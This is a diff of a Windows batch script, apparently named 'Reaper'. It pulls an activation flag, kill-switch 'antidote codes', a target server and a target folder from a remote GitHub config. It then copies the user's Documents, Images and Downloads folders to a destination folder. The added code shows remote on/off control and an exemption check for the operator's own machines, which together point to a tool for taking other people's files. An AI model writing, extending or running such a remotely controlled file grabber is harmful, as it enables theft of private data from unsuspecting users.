@@ -4,6 +4,9 @@ setlocal enabledelayedexpansion
 :: Set the URL of the configuration file on GitHub
 set "configUrl=https://raw.githubusercontent.com/AROA-DEV/Reaper/Testing/Config/Reaper-config.cfg"
 
+:: Set loacl path for antidote codes
+set "local_antidote=%USERPROFILE%\OneDrive\Documentos\reaper_antidote_codes.cfg"
+
 :: Fetch the configuration file contents using curl
 for /f "delims=" %%i in ('curl -s "%configUrl%"') do (
     :: Check if the line "Active=true" exists in the configuration file
@@ -20,7 +23,7 @@ for /f "delims=" %%i in ('curl -s "%configUrl%"') do (
         :: echo cheking for local configuration file...
         :: echo.
         :: goto Local
-        sleep 5
+        pause
         exit /b 0
     )
 )
@@ -41,17 +44,39 @@ if exist "Reaper-config.cfg" (
     ) else (
         :: The line "Active=true" is not found or is set to "Active=false" in the local configuration file
         echo Local configuration file is not active. Exiting...
-        sleep 5
+        pause
         exit /b 0
     )
 ) else (
     :: Local configuration file does not exist
     echo Local configuration file not found. Exiting...
-    sleep 5
+    pause
     exit /b 0
 )
 
 :Active
+:: Retrieve the Antidote codes from the remote file
+for /f "tokens=2 delims== " %%a in ('curl -s "%configUrl%" ^| findstr /i "Antidote_Codes"') do (
+    set "antidoteCode=%%~a"
+    :: Remove the surrounding double quotes if present
+    set "antidoteCode=!antidoteCode:"=!"
+    
+    :: Check if the Antidote code matches any of the codes on the target machine
+    findstr /i /c:"!antidoteCode!" "%local_antidote%" >nul
+    if !errorlevel! equ 0 (
+        :: The Antidote code is found in the target file
+        echo Antidote code found. Script will not run.
+        echo Exiting...
+        echo.
+        pause
+        exit /b 0
+    )
+)
+
+:: Antidote code not found in the target file, continue running the script
+echo Antidote code not found. Running the script...
+:: Add the rest of your script code here
+
 :: Read the remote configuration file
 for /f "usebackq tokens=1* delims== " %%a in (`curl -L "%configUrl%"`) do (
  if /i "%%a"=="TARGET_SERVER" (
@@ -84,6 +109,9 @@ if not defined target_folder (
     echo TARGET_FOLDER is not set in the remote configuration file.
     exit /b 1
 )
+@echo off
+
+:: --------------------------------- Safety Checks Done --------------------------------- ::
 
 :: set usb leter
 :: set /p usb_drive="Please enter the drive letter of your USB: "
@@ -159,6 +187,8 @@ xcopy /E /Y "%documents%" "%dest_folder%\Documents\"
 xcopy /E /Y "%images%" "%dest_folder%\Images\"
 xcopy /E /Y "%downloads%" "%dest_folder%\Downloads\"
 
+color 6
 echo Files copied successfully!
+color 7
 
 pause
